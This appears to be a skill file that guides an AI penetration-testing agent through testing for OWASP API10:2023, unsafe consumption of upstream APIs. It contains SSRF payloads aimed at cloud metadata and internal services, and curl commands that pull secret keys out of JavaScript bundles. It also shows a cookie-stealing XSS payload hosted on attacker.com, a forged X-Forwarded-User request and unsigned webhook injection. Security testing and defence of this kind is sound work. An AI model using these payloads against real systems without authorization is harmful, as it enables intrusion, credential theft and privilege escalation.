---
name: api_unsafe_upstream
description: API10 Unsafe Consumption of APIs — blindly trusting third-party / upstream API responses; SSRF chains, response-injection, deserialization of untrusted data
---

# API Unsafe Consumption of APIs

OWASP API Top 10 — **API10:2023**. The application correctly secures *its* API but blindly trusts the responses of OTHER APIs it consumes — third-party integrations, internal microservices, federated services. The trust is misplaced: any of those upstream sources can be compromised, misbehaving, or attacker-controlled.

## Why this matters

Most modern apps are integration spaghetti. They chain API calls: user → app → upstream API → another upstream → DB. A compromise of *any* upstream link, or attacker-controlled input that reaches one, attacks the app downstream.

## Attack surface

| Pattern | Example |
|---|---|
| Missing TLS verification on upstream | `requests.get(..., verify=False)` to an internal IP |
| Trusting upstream response without parsing limits | Accepting a 50MB JSON payload from an upstream and parsing it into memory |
| Unsafe deserialization of upstream responses | Using `pickle.loads()` / `eval()` / `unsafe_yaml.load()` on upstream data |
| Trusting upstream identity assertions | Accepting `X-Forwarded-User` from an upstream without binding to a verified identity |
| Server-side rendering of upstream content | Passing an upstream API response through a template engine (XSS) or HTML renderer (XSS / open redirect) |
| Mirroring upstream responses without filter | Forwarding an upstream's `Set-Cookie` / `Location` / `Authorization` headers to the client |
| Following redirects from upstream | The upstream returns `Location: file:///etc/passwd` or `Location: http://attacker.com` and the consumer follows it |
| Hardcoded credentials to upstream | API key in source code; no rotation; same key across env tiers |
| Lack of upstream rate-limit enforcement | Upstream throttles you → app falls over instead of degrading |
| Default-trusted upstream allow-list | The app trusts `*.partner.com` but partner.com had a subdomain takeover |

## Reconnaissance

### Identify the upstream surface

Look at the agent's prior recon:

```bash
# fingerprint_tech_stack output usually surfaces 3rd-party usage:
# Stripe, Twilio, SendGrid, Auth0, Okta, GitHub OAuth, Google OAuth, Slack APIs

# Crawl JS bundles for hardcoded URLs to other domains:
jq -r '.endpoints[] | select(.discovered_via == "js_bundle") | .url' < crawl_map.json | \
  awk -F/ '{print $3}' | sort -u

# Look for config / env exposure that leaks upstream endpoints:
curl -s https://api.target/.env  # don't bet on it; check anyway
curl -s https://api.target/config.json
curl -s https://api.target/api/health/dependencies  # often listed
```

The output is the candidate upstream list.

### Detect SSRF-shaped pathways into upstreams

If the user can supply a URL the server fetches (`/api/preview?url=`, `/api/oauth/callback?provider_url=`, webhook senders, file imports), test classic SSRF payloads:

```bash
# Internal metadata services:
?url=http://169.254.169.254/latest/meta-data/
?url=http://metadata.google.internal/computeMetadata/v1/

# Internal services (RFC1918 / link-local):
?url=http://10.0.0.1
?url=http://127.0.0.1:6379
?url=http://localhost:8500/v1/agent/self  # Consul

# DNS rebinding:
?url=http://7f000001.attacker.com  # resolves to 127.0.0.1 mid-request

# URL parser confusion:
?url=http://attacker.com#@target.com
?url=https://[::ffff:127.0.0.1]/
```

(See the dedicated `ssrf` skill for the full SSRF catalog. This skill is about the API-API axis where SSRF mostly intersects with API consumption.)

### Detect blindly-trusted upstream responses

```bash
# Look for endpoints that proxy upstream content:
/api/preview/url, /api/oembed, /api/lookup, /api/oauth/userinfo
/api/import/from, /api/webhook/process, /api/sync/from-partner

# What happens when you point them at attacker-controlled HTTP?
ngrok http 8080  # local listener returning attacker JSON
curl -X POST -H "$AUTH" -d '{"url":"https://abcd.ngrok.io/payload"}' \
  https://api.target/api/preview
```

The attacker-controlled response can return:
- `{"is_admin": true, "tenant": "victim_tenant"}` — does the app trust it?
- `<script>alert(1)</script>` rendered in HTML — does the app strip it?
- A 302 redirect to a different attacker target — does the app follow it?
- A 50 MB response — does the app crash or rate-limit?

### Detect upstream-credential exposure

```bash
# Source maps, build artifacts:
curl -s https://api.target/static/app.js.map | grep -E 'api_key|secret|token|bearer'

# JS bundles often embed publishable keys (Stripe pk_live_*) but
# sometimes also leak server-side keys:
curl -s https://api.target/static/app.js | \
  grep -oE '(sk_live_|sk_test_|xoxb-|ghp_|AKIA|AIza)[A-Za-z0-9_-]+'
```

A `sk_live_*` (Stripe secret) or `AKIA*` (AWS access key) in client-side JS = critical credential leak.

## Exploitation patterns

### 1. Upstream-content injection

```bash
# /api/preview takes a URL, returns the title + description from the page:
curl -X POST -H "$AUTH" -d '{"url":"https://attacker.com/payload.html"}' \
  https://api.target/api/preview

# attacker payload returns:
# <title>onmouseover=alert(1)</title>
# <meta name="description" content="<script>steal(document.cookie)</script>">

# The app renders these into a card → stored XSS via upstream consumption.
```

### 2. Upstream identity-assertion forgery

```bash
# Internal microservice X calls service Y. Y trusts header
# X-Forwarded-User without verifying a signature:
curl -H "X-Forwarded-User: alice@example.com" \
  http://internal-service-y.svc/me
# If alice is admin → privilege escalation.
```

If an SSRF gets into the internal mesh, this becomes practical.

### 3. Webhook callback abuse

```bash
# Service receives webhooks from upstream partner; verifies an HMAC
# signature using a shared key. Look for:
# - Missing signature verification
# - Weak signature (HMAC-MD5, fixed key)
# - Replay (no timestamp / nonce)

curl -X POST -H "Content-Type: application/json" \
  -d '{"event":"customer.created","customer":{"id":"victim_id","is_admin":true}}' \
  https://api.target/webhooks/stripe
# If accepted with no signature → criticism.
```

### 4. Hardcoded upstream credential extraction

```bash
# JS bundle reveals an admin-tier 3rd-party key:
grep -oE 'sk_(live|test)_[A-Za-z0-9]{24,}' < bundle.js
# Now the attacker has direct access to Stripe / Twilio / OpenAI as the
# operator's account → bills accumulate, customer data accessible.
```

### 5. Trust chain across cookie / token forwarding

```bash
# Upstream returns Set-Cookie; app forwards verbatim to client.
curl -s -X POST -H "$AUTH" -d '{"redirect":"https://attacker-controlled-upstream.com"}' \
  https://api.target/api/oauth/callback
# If attacker controls the upstream, they can set a cookie on the target's
# domain via the proxy.
```

## Verification

Quantify:
- **Where does the trust boundary actually live?** Trace from user input → app → upstream → response → re-rendered output. Find the spot where untrusted bytes from an upstream cross into a privileged context (DB write, response-rendering, identity assertion).
- **What does the attacker need to control?** If the app trusts ANY 3rd-party upstream, this is exploitable just by registering with the partner. If the app only trusts one specific URL, attack mostly requires SSRF or the partner being compromised.
- **What does success look like?** Code execution? Data leak? Identity confusion? Money cost?

## Findings to emit

- **Critical** (CWE-200 + CWE-798) — server-side credential to upstream API hardcoded in client-side JS
- **Critical** (CWE-915, mass_assignment / CWE-345, insufficient_verification) — upstream JSON response trusted for identity / privilege assertions without re-validation
- **High** (CWE-345, insufficient_verification) — webhook endpoint accepts payload without HMAC signature verification or with weak signature
- **High** (CWE-918, ssrf) — server-side SSRF allowing attacker to reach internal services (cross-reference `ssrf` skill for the SSRF-specific findings)
- **High** (CWE-79, xss) — upstream response content rendered in client HTML without sanitization
- **Medium** (CWE-300, channel_compromise) — TLS verification disabled on upstream connection
- **Medium** (CWE-770) — upstream response not size-bounded; can DoS via 50MB+ response from compromised upstream
- **Low** — `Authorization` / `Set-Cookie` / `Location` headers proxied verbatim from upstream to client

`verification_status="needs_review"` until the actual cross-trust step has been executed and the privilege boundary observed.

## Mitigation guidance

- Treat every upstream response as untrusted input — apply the same input-validation rules as for direct user input
- Re-validate identity assertions independently — never trust `X-Forwarded-User` / claim-only assertions without binding to a signed token
- Sign + timestamp webhook payloads (HMAC-SHA256 + nonce); reject anything older than N minutes
- Cap response sizes from upstream; stream-parse for large payloads
- Pin TLS certs to the upstream's expected CA where possible; never `verify=False`
- Strip / re-emit Set-Cookie / Location / Authorization on the proxy layer; never forward verbatim
- Move secret credentials to backend-only; rotate after any client-side build artifact is shipped
- Separate API keys per env tier (staging key cannot be used in prod)

## Related skills

- `ssrf` — comprehensive SSRF catalog (often the entry point for unsafe-upstream chains)
- `xxe` — when upstream returns XML
- `mass_assignment` — when upstream-derived data is bound to internal models
- `idor` — when trusting an upstream-supplied object ID
